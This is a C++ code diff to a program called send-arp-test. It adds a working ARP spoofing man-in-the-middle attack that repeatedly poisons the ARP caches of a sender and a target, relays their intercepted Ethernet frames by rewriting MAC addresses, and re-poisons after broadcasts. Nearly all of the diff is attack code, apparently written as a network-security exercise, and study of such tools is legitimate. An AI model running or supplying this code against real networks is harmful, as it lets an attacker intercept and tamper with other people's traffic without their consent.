@@ -8,12 +8,22 @@
 #include "ethhdr.h"
 #include "arphdr.h"
 #include <stdio.h>
+#include <vector>
 #pragma pack(push, 1)
 struct EthArpPacket final {
     EthHdr eth_;
     ArpHdr arp_;
 };
 #pragma pack(pop)
+struct FlowInfo {
+    std::string sender_ip;
+    std::string target_ip;
+    Mac sender_mac;
+    Mac target_mac;
+    std::thread spoof_thread;
+};
+std::vector<FlowInfo> active_flows;
+int spoof_interval = 10;
 char find_attacker_mac_ip(char* dev, uint8_t* attacker_mac, char* attacker_ip){
     struct ifaddrs *ifaddr, *ifa;
     if (getifaddrs(&ifaddr) == -1) {
@@ -102,21 +112,71 @@ void send_arp_request(pcap_t* pcap, const char* find_ip, const char* attacker_ip
 std::thread arp_spoof_thread;
 
 void start_arp_spoofing(pcap_t* pcap, const char* sender_ip, const char* target_ip, const Mac& sender_mac, const Mac& target_mac, const Mac& attacker_mac) {
-    arp_spoof_thread = std::thread([&]() {
+    arp_spoof_thread = std::thread([=]() {
         while (true) {
             send_arp_reply(pcap, sender_ip, target_ip, sender_mac, attacker_mac);
             send_arp_reply(pcap, target_ip, sender_ip, target_mac, attacker_mac);
+            std::this_thread::sleep_for(std::chrono::seconds(spoof_interval));
         }
     });
 }
 
 void stop_arp_spoofing() {
-    if (arp_spoof_thread.joinable()) {
-        arp_spoof_thread.join();
+        if (arp_spoof_thread.joinable()) {
+            arp_spoof_thread.join();
+        }
+}
+
+void arp_spoofng(uint8_t* target_mac, char *target_ip, char *sender_ip, uint8_t* sender_mac, struct EthHdr* eth, pcap_t* pcap, bool& broadcast_received, uint8_t* attacker_mac)
+{
+    if (eth->dmac_ == Mac::broadcastMac()) {
+        if (!broadcast_received) {
+            start_arp_spoofing(pcap, sender_ip, target_ip, sender_mac, target_mac, attacker_mac);
+            broadcast_received = true;
+        }
+    } else {
+        stop_arp_spoofing();
+        broadcast_received = false;
     }
 }
+
+void relay_packet(uint8_t* target_mac, struct pcap_pkthdr *header, uint8_t* attacker_mac, const u_char *recv_packet, struct EthHdr* eth, uint8_t* sender_mac, pcap_t* pcap)
+{
+    if (memcmp((uint8_t*)eth->smac_, sender_mac, Mac::Size) == 0 &&
+        memcmp((uint8_t*)eth->dmac_, attacker_mac, Mac::Size) == 0) {
+
+        u_char *packet_mod = new u_char[header->caplen];
+        memcpy(packet_mod, recv_packet, header->caplen);
+
+        struct EthHdr* eth_mod = (struct EthHdr*)packet_mod;
+
+        memcpy((uint8_t*)eth_mod->smac_, attacker_mac, Mac::Size);
+        memcpy((uint8_t*)eth_mod->dmac_, target_mac, Mac::Size);
+
+        pcap_sendpacket(pcap, packet_mod, header->caplen);
+
+        delete[] packet_mod;
+    }
+    else if (memcmp((uint8_t*)eth->smac_, target_mac, Mac::Size) == 0 &&
+             memcmp((uint8_t*)eth->dmac_, attacker_mac, Mac::Size) == 0) {
+
+        u_char *packet_mod = new u_char[header->caplen];
+        memcpy(packet_mod, recv_packet, header->caplen);
+
+        struct EthHdr* eth_mod = (struct EthHdr*)packet_mod;
+
+        memcpy((uint8_t*)eth_mod->smac_, attacker_mac, Mac::Size);
+        memcpy((uint8_t*)eth_mod->dmac_, sender_mac, Mac::Size);
+
+        pcap_sendpacket(pcap, packet_mod, header->caplen);
+
+        delete[] packet_mod;
+    }
+}
+
+
 int main(int argc, char* argv[]) {
-    if (argc < 4 || (argc % 2 == 1 && argc >= 4)) {
+    if (argc < 4 || argc % 2 == 1) {
         printf("send-arp-test <interface> <sender IP> <target IP> ...\n");
         printf("send-arp-test wlan0 172.30.1.97 172.30.1.254\n");
         return EXIT_FAILURE;
@@ -137,70 +197,21 @@ int main(int argc, char* argv[]) {
     for (int i = 2; i < argc; i += 2) {
         char *sender_ip = argv[i];
         char *target_ip = argv[i + 1];
-        send_arp_request(pcap, sender_ip, attacker_ip, sender_mac, attacker_mac);
         send_arp_request(pcap, target_ip, attacker_ip, target_mac, attacker_mac);
+        send_arp_request(pcap, sender_ip, attacker_ip, sender_mac, attacker_mac);
         send_arp_reply(pcap, target_ip, sender_ip, target_mac, attacker_mac);
         send_arp_reply(pcap, sender_ip, target_ip, sender_mac, attacker_mac);
-
+        bool broadcast_received = false;
         while (true) {
             struct pcap_pkthdr *header;
             const u_char *recv_packet;
-            struct EthHdr* eth = (struct EthHdr*)recv_packet;
-
             int res = pcap_next_ex(pcap, &header, &recv_packet);
+            struct EthHdr* eth = (struct EthHdr*)recv_packet;
             if (res == 0) continue;
             if (res == -1 || res == -2) break;
+            relay_packet(target_mac, header, attacker_mac, recv_packet, eth, sender_mac, pcap);
+            arp_spoofng(target_mac, target_ip, sender_ip, sender_mac, eth, pcap, broadcast_received, attacker_mac);
 
-            if (memcmp((uint8_t*)eth->smac_, sender_mac, Mac::Size) == 0 &&
-                memcmp((uint8_t*)eth->dmac_, attacker_mac, Mac::Size) == 0) {
-
-                u_char *packet_mod = new u_char[header->caplen];
-                memcpy(packet_mod, recv_packet, header->caplen);
-
-                struct EthHdr* eth_mod = (struct EthHdr*)packet_mod;
-
-                memcpy((uint8_t*)eth_mod->smac_, attacker_mac, Mac::Size);
-                memcpy((uint8_t*)eth_mod->dmac_, target_mac, Mac::Size);
-
-                pcap_sendpacket(pcap, packet_mod, header->caplen);
-
-                delete[] packet_mod;
-            }
-            else if (memcmp((uint8_t*)eth->smac_, target_mac, Mac::Size) == 0 &&
-                     memcmp((uint8_t*)eth->dmac_, attacker_mac, Mac::Size) == 0) {
-
-                u_char *packet_mod = new u_char[header->caplen];
-                memcpy(packet_mod, recv_packet, header->caplen);
-
-                struct EthHdr* eth_mod = (struct EthHdr*)packet_mod;
-
-                memcpy((uint8_t*)eth_mod->smac_, attacker_mac, Mac::Size);
-                memcpy((uint8_t*)eth_mod->dmac_, sender_mac, Mac::Size);
-
-                pcap_sendpacket(pcap, packet_mod, header->caplen);
-
-                delete[] packet_mod;
-            }
-        }
-        bool broadcast_received = false;
-
-        while (true) {
-            struct pcap_pkthdr *header;
-            const u_char *recv_packet;
-            struct EthHdr* eth = (struct EthHdr*)recv_packet;
-
-            int res = pcap_next_ex(pcap, &header, &recv_packet);
-            if (res == 0) continue;
-
-            if (eth->dmac_ == Mac::broadcastMac()) {
-                if (!broadcast_received) {
-                    start_arp_spoofing(pcap, sender_ip, target_ip, sender_mac, target_mac, attacker_mac);
-                    broadcast_received = true;
-                }
-            } else {
-                stop_arp_spoofing();
-                broadcast_received = false;
-            }
         }
     }
 
